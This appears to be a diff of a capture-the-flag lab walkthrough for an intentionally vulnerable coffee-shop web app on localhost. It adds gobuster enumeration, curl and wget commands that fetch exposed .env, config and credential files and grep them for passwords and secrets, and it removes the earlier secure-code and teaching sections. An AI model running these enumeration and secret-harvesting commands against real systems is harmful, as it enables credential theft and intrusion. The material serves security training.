@@ -81,75 +81,56 @@ curl http://localhost:3002/api/example/auth-check
 ### Vulnerability
 Debug endpoint left enabled in production environment, exposing system information.
 
+### Required Tools
+- `gobuster` - Directory/endpoint enumeration
+- `curl` - HTTP API testing
+
 ### Exploitation Steps
 
-1. **Reconnaissance:** Explore the staff dashboard page
-2. **API Discovery:** Look for debug or system-info endpoints
-3. **Access Endpoint:**
+1. **Enumerate API Endpoints:**
    ```bash
+   # Discover hidden debug endpoints
+   gobuster dir -u http://localhost:3002/api \
+     -w /usr/share/wordlists/dirb/common.txt \
+     -t 50
+   
+   # Look for staff/admin endpoints
+   gobuster dir -u http://localhost:3002/api/staff \
+     -w /usr/share/wordlists/dirb/common.txt \
+     -t 50
+   ```
+
+2. **Access Debug Endpoint:**
+   ```bash
+   # Direct access to system-info endpoint
    curl http://localhost:3002/api/staff/system-info
    ```
 
+3. **Extract Flag:**
+   ```bash
+   # Format JSON output to find flag
+   curl -s http://localhost:3002/api/staff/system-info | jq '.flag'
+   ```
 ### Flag
-`FLAG{D3BUG_1NF0_3XP0S3D}`
+`NSA{D3BUG_F0UND}`
 
-### Sensitive Data Exposed
+### Expected Output
 ```json
 {
-  "success": true,
-  "flag": "FLAG{D3BUG_1NF0_3XP0S3D}",
-  "systemInfo": {
-    "nodeVersion": "v18.17.0",
+  "flag": "NSA{D3BUG_F0UND}",
+  "message": "System information retrieved successfully!",
+  "vulnerability": "Debug endpoint exposed - reveals system details",
+  "system_info": {
+    "node_version": "v20.11.0",
     "platform": "linux",
-    "memory": {
-      "total": "8 GB",
-      "used": "2.4 GB"
-    },
-    "database": {
-      "host": "db.beanscene.local",
-      "status": "connected"
-    },
-    "debugMode": true
-  }
+    "uptime_seconds": 1234,
+    "memory_mb": 45,
+    "environment": "production"
+  },
+  "database_host": "db.clouddeploy.io",
+  "warning": "This endpoint should not be accessible in production!"
 }
 ```
-
-### Vulnerable Code Pattern
-```javascript
-app.get('/api/staff/system-info', (req, res) => {
-    // VULNERABILITY: No authentication check on debug endpoint
-    res.json({
-        nodeVersion: process.version,
-        platform: process.platform,
-        memory: process.memoryUsage(),
-        database: { host: process.env.DB_HOST },
-        debugMode: true
-    });
-});
-```
-
-### Secure Implementation
-```javascript
-app.get('/api/staff/system-info', (req, res) => {
-    // Verify authentication and admin role
-    if (!req.session || req.session.role !== 'admin') {
-        return res.status(403).json({ error: 'Access denied' });
-    }
-    
-    // In production, this endpoint should not exist at all
-    if (process.env.NODE_ENV === 'production') {
-        return res.status(404).json({ error: 'Not found' });
-    }
-    
-    // Minimal info if really needed
-    res.json({ status: 'operational' });
-});
-```
-
-### Teaching Points
-- Debug endpoints must be disabled in production
-- System information aids attackers in reconnaissance
-- Use environment variables to control debug features
 
 ---
 
@@ -160,31 +141,42 @@ app.get('/api/staff/system-info', (req, res) => {
 **Stage:** Scanning  
 
 ### Vulnerability
-.env file and backup files accessible via web due to misconfigured static file serving. This is a classic misconfiguration where sensitive environment files are not properly restricted.
+.env file and backup files accessible via web due to misconfigured static file serving.
+
+### Required Tools
+- `gobuster` - File/directory enumeration with extensions
+- `curl` - HTTP file retrieval
 
 ### Exploitation Steps
 
-1. **Test Common Files:**
+1. **Enumerate Common Config Files:**
    ```bash
-   # Try accessing common configuration files
+   # Scan for common exposed files
+   gobuster dir -u http://localhost:3002 \
+     -w /usr/share/wordlists/dirb/common.txt \
+     -x .env,.env.backup,.git,.config \
+     -t 50
+   ```
+
+2. **Test Known Vulnerable Paths:**
+   ```bash
+   # Try common misconfigurations
    curl http://localhost:3002/.env
    curl http://localhost:3002/.env.backup
+   curl http://localhost:3002/.env.local
    curl http://localhost:3002/.git/config
    ```
 
-2. **Read .env Contents:**
+3. **Extract Credentials from .env:**
    ```bash
-   curl http://localhost:3002/.env
+   # Download and parse .env file
+   curl -s http://localhost:3002/.env | grep -E "PASSWORD|SECRET|KEY|FLAG"
    ```
 
-### Flag
-`FLAG{3NV_F1L3_3XP0S3D}` (in .env file)  
-Bonus: `FLAG{B4CKUP_F1L3_L34K3D}` (in .env.backup)
-
-### Sensitive Data Exposed
-```
-# BeanScene Coffee - Environment Configuration
-NODE_ENV=production
+4. **Capture Flag:**
+   ```bash
+   curl -s http://localhost:3002/.env | grep NSA
+   ```
 DB_PASSWORD=Bean$cene2024!
 JWT_SECRET=beanscene_jwt_secret_key_12345
 SESSION_SECRET=coffee-shop-session-2024
@@ -249,43 +241,83 @@ location ~* \.(env|git|htaccess|htpasswd|backup|old)$ {
 
 ---
 
-## LAB 3: Manager Portal (HARD - Initial Access)
+## LAB 3: Manager Portal - Directory Listing
 
-**URL:** http://localhost:3002/lab3  
-**Challenge:** Discover directory listing vulnerability exposing sensitive files  
-**Stage:** Initial Access  
+**Difficulty:** Hard  
+**Stage:** Initial Access
 
 ### Vulnerability
-Directory listing enabled for /admin directory, exposing configuration files and credentials. This is a common misconfiguration in web servers where automatic directory indexing is not disabled.
+Directory listing enabled for /admin directory, exposing configuration files and credentials.
+
+### Required Tools
+- `gobuster` - Directory enumeration
+- `curl` - HTTP requests
+- `lynx` or `wget` (optional) - Download files
 
 ### Exploitation Steps
 
-1. **Discover Admin Directory:**
-   ```bash
-   # Try common admin paths
-   curl http://localhost:3002/admin
-   curl http://localhost:3002/admin/
-   ```
+**Discover Admin Directories:**
 
-2. **Browse Directory Listing:**
-   The server returns an HTML directory index showing:
-   - config.json
-   - backup/ directory
-   - logs/ directory
-   - credentials.txt
+```bash
+# Enumerate directories on target
+gobuster dir -u http://localhost:3002 \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -t 50
 
-3. **Access Sensitive Files:**
-   ```bash
-   curl http://localhost:3002/admin/credentials.txt
-   curl http://localhost:3002/admin/config.json
-   ```
-
-### Flag
-`FLAG{D1R3CT0RY_L1ST1NG_3N4BL3D}`
-
-### Sensitive Data Exposed
+# Common admin paths to check
+curl -I http://localhost:3002/admin
+curl -I http://localhost:3002/admin/
+curl -I http://localhost:3002/manager
+curl -I http://localhost:3002/administrator
 ```
-BeanScene Admin Credentials
+
+**Test for Directory Listing:**
+
+```bash
+# Directory listing returns HTML with file links
+curl -s http://localhost:3002/admin/ | grep -E '<a href|</a>'
+
+# Look for common sensitive files
+curl -s http://localhost:3002/admin/ | grep -E 'config|credentials|backup|log'
+```
+
+**Access Sensitive Files:**
+
+```bash
+# Retrieve credentials file
+curl -s http://localhost:3002/admin/credentials.txt
+
+# Download config files
+curl -s http://localhost:3002/admin/config.json | jq '.'
+
+# Extract flag
+curl -s http://localhost:3002/admin/credentials.txt | grep -o 'NSA{[^}]*}'
+```
+
+**Alternative: Using wget to Mirror Directory**
+
+```bash
+# Download entire admin directory
+wget -r -np -nH --cut-dirs=1 http://localhost:3002/admin/
+
+# Search downloaded files for flags
+grep -r "NSA{" admin/
+```
+
+**Enumerate Subdirectories:**
+
+```bash
+# Check for backup directories
+curl -I http://localhost:3002/admin/backup/
+curl -I http://localhost:3002/admin/logs/
+curl -I http://localhost:3002/admin/tmp/
+
+# Download all accessible files
+for file in config.json credentials.txt settings.xml; do
+  curl -s http://localhost:3002/admin/$file -o $file
+  echo "Downloaded: $file"
+done
+```
 =================================
 Username: manager
 Password: Coffee2024!
